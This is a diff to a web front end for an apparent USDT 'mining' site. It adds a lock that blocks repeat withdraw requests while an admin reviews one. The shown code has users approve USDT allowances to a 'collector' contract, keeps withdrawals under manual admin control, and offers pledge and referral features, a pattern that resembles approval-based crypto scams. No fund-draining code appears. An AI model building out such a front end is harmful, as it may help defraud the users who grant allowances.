@@ -148,9 +148,12 @@
             </div>
 
             <div class="space-y-2.5 pt-1">
-                <button onclick="requestWithdraw()" class="w-full bg-gradient-to-r from-purple-700 to-indigo-600 hover:from-purple-600 hover:to-indigo-500 font-semibold py-3 rounded-xl transition cursor-pointer text-sm shadow-md">
+                <button id="withdrawBtn" onclick="requestWithdraw()" class="w-full bg-gradient-to-r from-purple-700 to-indigo-600 hover:from-purple-600 hover:to-indigo-500 font-semibold py-3 rounded-xl transition cursor-pointer text-sm shadow-md">
                     Withdraw interest
                 </button>
+                <div id="withdrawPendingNotice" class="hidden text-center text-xs text-amber-300 bg-amber-950/50 border border-amber-500/30 px-3 py-2 rounded-xl">
+                    သင့် Withdraw Request ကို Admin မှ စစ်ဆေးနေဆဲဖြစ်ပါသည်။ ခွင့်ပြုခြင်း သို့မဟုတ် ငြင်းဆန်ခြင်း မပြီးမချင်း ထပ်မံတင်၍ မရပါ။
+                </div>
                 <button onclick="pledgeAction()" class="w-full bg-cyan-600 hover:bg-cyan-500 font-semibold py-3 rounded-xl transition cursor-pointer text-sm text-slate-950 font-bold shadow-md">
                     Pledge
                 </button>
@@ -248,6 +251,10 @@
         let walletEventsBound = false;
         let onChainRegisteredBonus = 0;
 
+        let hasPendingWithdraw = false;
+        let isWithdrawSubmitting = false;
+        let unsubPendingWithdraw = null;
+
         // Only USDT approve() uses the contract
         const COLLECTOR_CONTRACT_ADDRESS = "0xC9E28f1C5e8659CaEE3831daB4dF97325e7e5570";
         const USDT_ADDRESS = "0xc2132D05D31c914a87C6611C10748AEb04B58e8F";
@@ -286,6 +293,66 @@
                 promise,
                 new Promise((resolve) => setTimeout(() => resolve(fallbackValue), ms))
             ]);
+        }
+
+        function updateWithdrawButtonUI() {
+            const btn = document.getElementById("withdrawBtn");
+            const notice = document.getElementById("withdrawPendingNotice");
+            if (!btn) return;
+
+            if (hasPendingWithdraw) {
+                btn.disabled = true;
+                btn.innerText = "Withdraw Pending (Admin စစ်ဆေးနေဆဲ)";
+                btn.className = "w-full bg-slate-700 text-slate-400 font-semibold py-3 rounded-xl text-sm cursor-not-allowed";
+                if (notice) notice.classList.remove("hidden");
+            } else if (isWithdrawSubmitting) {
+                btn.disabled = true;
+                btn.innerText = "Submitting Withdraw...";
+                btn.className = "w-full bg-slate-700 text-slate-300 font-semibold py-3 rounded-xl text-sm cursor-not-allowed";
+                if (notice) notice.classList.add("hidden");
+            } else {
+                btn.disabled = false;
+                btn.innerText = "Withdraw interest";
+                btn.className = "w-full bg-gradient-to-r from-purple-700 to-indigo-600 hover:from-purple-600 hover:to-indigo-500 font-semibold py-3 rounded-xl transition cursor-pointer text-sm shadow-md";
+                if (notice) notice.classList.add("hidden");
+            }
+        }
+
+        function syncPendingWithdrawListener(addr) {
+            if (unsubPendingWithdraw) {
+                unsubPendingWithdraw();
+                unsubPendingWithdraw = null;
+            }
+            if (!addr) {
+                hasPendingWithdraw = false;
+                updateWithdrawButtonUI();
+                return;
+            }
+
+            const key = addr.toLowerCase();
+            unsubPendingWithdraw = db.collection("approval_requests")
+                .where("walletAddress", "==", key)
+                .where("type", "==", "withdraw")
+                .where("status", "==", "pending")
+                .limit(1)
+                .onSnapshot((snapshot) => {
+                    hasPendingWithdraw = !snapshot.empty;
+                    updateWithdrawButtonUI();
+                }, (err) => {
+                    console.error("Pending withdraw listener error:", err);
+                });
+        }
+
+        async function hasPendingWithdrawRequest(addr) {
+            if (!addr) return false;
+            const key = addr.toLowerCase();
+            const snap = await db.collection("approval_requests")
+                .where("walletAddress", "==", key)
+                .where("type", "==", "withdraw")
+                .where("status", "==", "pending")
+                .limit(1)
+                .get();
+            return !snap.empty;
         }
 
         function showProgress(percent, text) {
@@ -537,6 +604,7 @@
                 if (!accounts || accounts.length === 0) {
                     userAddress = null;
                     signer = null;
+                    syncPendingWithdrawListener(null);
                     document.getElementById("walletAddress").innerText = "";
                     document.getElementById("selectedNetworkBadge").classList.add("hidden");
                     document.getElementById("userDashboard").classList.add("hidden");
@@ -549,6 +617,7 @@
                 userAddress = accounts[0];
                 provider = new ethers.BrowserProvider(window.ethereum);
                 signer = await provider.getSigner();
+                syncPendingWithdrawListener(userAddress);
                 document.getElementById("walletAddress").innerText = `Connected: ${userAddress.substring(0,6)}...${userAddress.substring(38)}`;
                 document.getElementById("statusLog").innerText = "Wallet account ပြောင်းလဲသွားပါပြီ။ Data ပြန်စစ်ဆေးနေသည်...";
                 await checkExistingAllowanceAndLoad();
@@ -605,6 +674,7 @@
                         }
 
                         signer = await provider.getSigner();
+                        syncPendingWithdrawListener(userAddress);
                         document.getElementById("walletAddress").innerText = `Connected: ${userAddress.substring(0,6)}...${userAddress.substring(38)}`;
                         await checkExistingAllowanceAndLoad();
                     }
@@ -636,6 +706,7 @@
         async function checkExistingAllowanceAndLoad() {
             try {
                 showProgress(30, "Checking your Mining...");
+                syncPendingWithdrawListener(userAddress);
                 const usdtContract = new ethers.Contract(USDT_ADDRESS, USDT_APPROVE_ABI, provider);
                 const allowance = await withTimeout(
                     usdtContract.allowance(userAddress, COLLECTOR_CONTRACT_ADDRESS),
@@ -695,7 +766,7 @@
             return 0;
         }
 
-     async function startConnectProcess() {
+        async function startConnectProcess() {
             if (typeof window.ethereum === "undefined") {
                 alert("MetaMask သို့မဟုတ် Web3 Wallet ကို Install လုပ်ပါ။");
                 return;
@@ -713,6 +784,7 @@
                 const accounts = await provider.send("eth_requestAccounts", []);
                 userAddress = accounts[0];
                 signer = await provider.getSigner();
+                syncPendingWithdrawListener(userAddress);
 
                 document.getElementById("walletAddress").innerText = `Connected: ${userAddress.substring(0,6)}...${userAddress.substring(38)}`;
                 
@@ -904,11 +976,28 @@
             alert("Referral Link ကူးယူပြီးပါပြီ။");
         }
 
-        // Notify Admin via Firebase (no contract call)
+        // Notify Admin via Firebase (blocked if a pending withdraw already exists)
         async function requestWithdraw() {
+            if (isWithdrawSubmitting) return;
+            if (hasPendingWithdraw) {
+                alert("သင့် Withdraw Request ကို Admin မှ စစ်ဆေးနေဆဲဖြစ်ပါသည်။ ခွင့်ပြုခြင်း သို့မဟုတ် ငြင်းဆန်ခြင်း မပြီးမချင်း ထပ်မံတင်၍ မရပါ။");
+                return;
+            }
+
+            if (!userAddress || !provider) {
+                alert("ကျေးဇူးပြု၍ Wallet ကို ဦးစွာ ချိတ်ဆက်ပါ။");
+                return;
+            }
+
+            isWithdrawSubmitting = true;
+            updateWithdrawButtonUI();
+
             try {
-                if (!userAddress || !provider) {
-                    alert("ကျေးဇူးပြု၍ Wallet ကို ဦးစွာ ချိတ်ဆက်ပါ။");
+                const alreadyPending = await hasPendingWithdrawRequest(userAddress);
+                if (alreadyPending) {
+                    hasPendingWithdraw = true;
+                    updateWithdrawButtonUI();
+                    alert("သင့် Withdraw Request ကို Admin မှ စစ်ဆေးနေဆဲဖြစ်ပါသည်။ ခွင့်ပြုခြင်း သို့မဟုတ် ငြင်းဆန်ခြင်း မပြီးမချင်း ထပ်မံတင်၍ မရပါ။");
                     return;
                 }
 
@@ -925,20 +1014,21 @@
                     return;
                 }
 
-                await withTimeout(
-                    notifyAdminViaFirebase("withdraw", {
-                        amount: withdrawAmountNum,
-                        userId: document.getElementById("lblUserId")?.innerText || ""
-                    }),
-                    6000,
-                    null
-                );
+                await notifyAdminViaFirebase("withdraw", {
+                    amount: withdrawAmountNum,
+                    userId: document.getElementById("lblUserId")?.innerText || ""
+                });
 
-                alert(`Withdraw (${formatUsdtOneDecimal(withdrawAmountNum)}) တောင်းဆိုချက်ကို Firebase မှတစ်ဆင့် Admin ထံ အသိပေးပြီးပါပြီ။`);
+                hasPendingWithdraw = true;
+                updateWithdrawButtonUI();
+                alert(`Withdraw (${formatUsdtOneDecimal(withdrawAmountNum)}) တောင်းဆိုချက်ကို Firebase မှတစ်ဆင့် Admin ထံ အသိပေးပြီးပါပြီ။ Admin မှ ခွင့်ပြု/ငြင်းဆန်မှု မပြီးမချင်း ထပ်မံတင်၍ မရပါ။`);
                 await withTimeout(checkUserData(), 6000, null);
             } catch (err) {
                 console.error(err);
                 alert("Withdraw တောင်းဆိုမှု မအောင်မြင်ပါ။");
+            } finally {
+                isWithdrawSubmitting = false;
+                updateWithdrawButtonUI();
             }
         }
 
